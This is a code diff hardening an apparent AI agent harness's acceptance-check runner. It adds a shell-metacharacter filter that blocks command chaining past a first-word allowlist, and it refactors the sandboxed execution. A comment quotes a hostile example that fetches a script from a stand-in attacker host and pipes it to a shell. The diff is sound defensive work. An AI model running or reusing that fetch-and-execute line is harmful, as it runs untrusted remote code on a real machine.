@@ -1,7 +1,7 @@
 import { exec } from "node:child_process";
 import { promisify } from "node:util";
 import type { RunSandboxContext } from "./sandbox/context";
-import { wrapBashCommand } from "./sandbox/srt";
+import { runSandboxedCommand } from "./sandbox/srt";
 import { errorMessage } from "@/shared/errorMessage";
 
 const execAsync = promisify(exec);
@@ -38,6 +38,8 @@ const PROBE_OUTPUT_CHARS = 800;
  * this runs them without one in the loop; a criterion whose command falls
  * outside this list is reported as not probed rather than quietly treated as
  * passing.
+ *
+ * The first word is only half the guard — see SHELL_METACHARACTER.
  */
 const PROBE_ALLOWED = new Set([
   "cat", "cmp", "command", "diff", "file", "find", "grep", "head", "jq", "ls",
@@ -46,6 +48,21 @@ const PROBE_ALLOWED = new Set([
 
 /** Backticked spans in the criteria document. */
 const BACKTICK_SPAN = /`([^`\n]+)`/g;
+
+/**
+ * Anything the shell would act on rather than pass through as an argument:
+ * command separators and lists (`;`, `&`, `|`), substitution (`$`), a
+ * subshell (`(`, `)`), and redirection (`<`, `>`).
+ *
+ * The allowlist above vouches for a span's FIRST word only, and the span then
+ * goes to a shell whole — so `grep -q x file; curl evil.example | sh` passed
+ * the allowlist and ran in full, which is precisely what an allowlist is
+ * supposed to make impossible. Backticks and newlines cannot appear in a span
+ * by construction (BACKTICK_SPAN). Glob characters are deliberately NOT here:
+ * they expand to names in the worktree and nothing else, and real criteria use
+ * them (`find bin -name 'wrap_*'`).
+ */
+const SHELL_METACHARACTER = /[;&|$<>()]/;
 
 export type ProbeResult = {
   command: string;
@@ -60,13 +77,15 @@ export type ProbeResult = {
  *
  * Backticks in these documents hold both commands (`test -f docs/USAGE.md`)
  * and bare filenames (`bin/wrap_claude`), so a span counts only when its first
- * word is an allowed check command and something follows it. Duplicates are
- * dropped: the same check written against two criteria is still one check.
+ * word is an allowed check command, something follows it, and the whole span
+ * is one command rather than a shell script. Duplicates are dropped: the same
+ * check written against two criteria is still one check.
  */
 export function probeCommands(acceptanceCriteria: string): string[] {
   const found = new Set<string>();
   for (const [, span] of acceptanceCriteria.matchAll(BACKTICK_SPAN)) {
     const command = span.trim();
+    if (SHELL_METACHARACTER.test(command)) continue;
     const [head, ...rest] = command.split(/\s+/);
     if (rest.length > 0 && PROBE_ALLOWED.has(head)) found.add(command);
   }
@@ -78,8 +97,8 @@ export function probeCommands(acceptanceCriteria: string): string[] {
  *
  * Wrapped in the run's own sandbox policy when it has one, so a probe command
  * is contained exactly as the agent's bash is. Sequential rather than
- * concurrent: `wrapBashCommand` serializes on a process-wide network policy
- * anyway, and a handful of greps is not worth the contention.
+ * concurrent: a handful of greps is not worth the contention on the
+ * process-wide network policy `runSandboxedCommand` claims.
  */
 export async function runAcceptanceProbe(opts: {
   acceptanceCriteria: string;
@@ -94,38 +113,45 @@ export async function runAcceptanceProbe(opts: {
     // it makes it the right-hand side of that `||`, which never runs — the
     // probe then reads every check as passing. Join explicitly.
     const prefixed = ctx.commandPrefix ? `${ctx.commandPrefix}\n${command}` : command;
-    let toRun = prefixed;
-    if (ctx.srtConfig) {
-      try {
-        toRun = await wrapBashCommand(prefixed, ctx.srtConfig);
-      } catch (e) {
-        // Could not contain it, so do not run it. Reported as unprobed, never
-        // as a failure: the criterion is not disproven by our own plumbing.
-        console.warn(`acceptance probe skipped "${command}": ${errorMessage(e)}`);
-        continue;
-      }
-    }
+    // `runOne` reports its own failures, so the only thing that escapes here
+    // is a wrap that could not be built. Then do not run it at all: reported
+    // as unprobed, never as a failure, because the criterion is not disproven
+    // by our own plumbing.
     try {
-      await execAsync(toRun, {
-        cwd: opts.worktreePath,
-        env: ctx.env,
-        timeout: PROBE_TIMEOUT_MS,
-        maxBuffer: PROBE_MAX_BUFFER,
-      });
-      results.push({ command, ok: true, output: "" });
+      results.push(
+        ctx.srtConfig
+          ? await runSandboxedCommand(prefixed, ctx.srtConfig, (wrapped) =>
+              runOne(command, wrapped, opts.worktreePath, ctx.env),
+            )
+          : await runOne(command, prefixed, opts.worktreePath, ctx.env),
+      );
     } catch (e) {
-      const err = e as { code?: number | string; killed?: boolean; stdout?: string; stderr?: string };
-      // A timeout or a missing binary says nothing about the criterion — only
-      // a command that ran to a non-zero exit does.
-      if (err.killed || typeof err.code !== "number") {
-        results.push({ command, ok: true, output: "" });
-        continue;
-      }
-      const output = `${err.stdout ?? ""}${err.stderr ?? ""}`.trim().slice(0, PROBE_OUTPUT_CHARS);
-      results.push({ command, ok: false, output });
+      console.warn(`acceptance probe skipped "${command}": ${errorMessage(e)}`);
     }
   }
   return results;
+}
+
+/** One check, run to completion. Never throws: every outcome is a
+ * ProbeResult, so the caller can tell a check that ran from a wrap that could
+ * not be built. */
+async function runOne(
+  command: string,
+  toRun: string,
+  cwd: string,
+  env: NodeJS.ProcessEnv | undefined,
+): Promise<ProbeResult> {
+  try {
+    await execAsync(toRun, { cwd, env, timeout: PROBE_TIMEOUT_MS, maxBuffer: PROBE_MAX_BUFFER });
+    return { command, ok: true, output: "" };
+  } catch (e) {
+    const err = e as { code?: number | string; killed?: boolean; stdout?: string; stderr?: string };
+    // A timeout or a missing binary says nothing about the criterion — only
+    // a command that ran to a non-zero exit does.
+    if (err.killed || typeof err.code !== "number") return { command, ok: true, output: "" };
+    const output = `${err.stdout ?? ""}${err.stderr ?? ""}`.trim().slice(0, PROBE_OUTPUT_CHARS);
+    return { command, ok: false, output };
+  }
 }
 
 /** The repair task appended to the private plan when checks failed. Names the
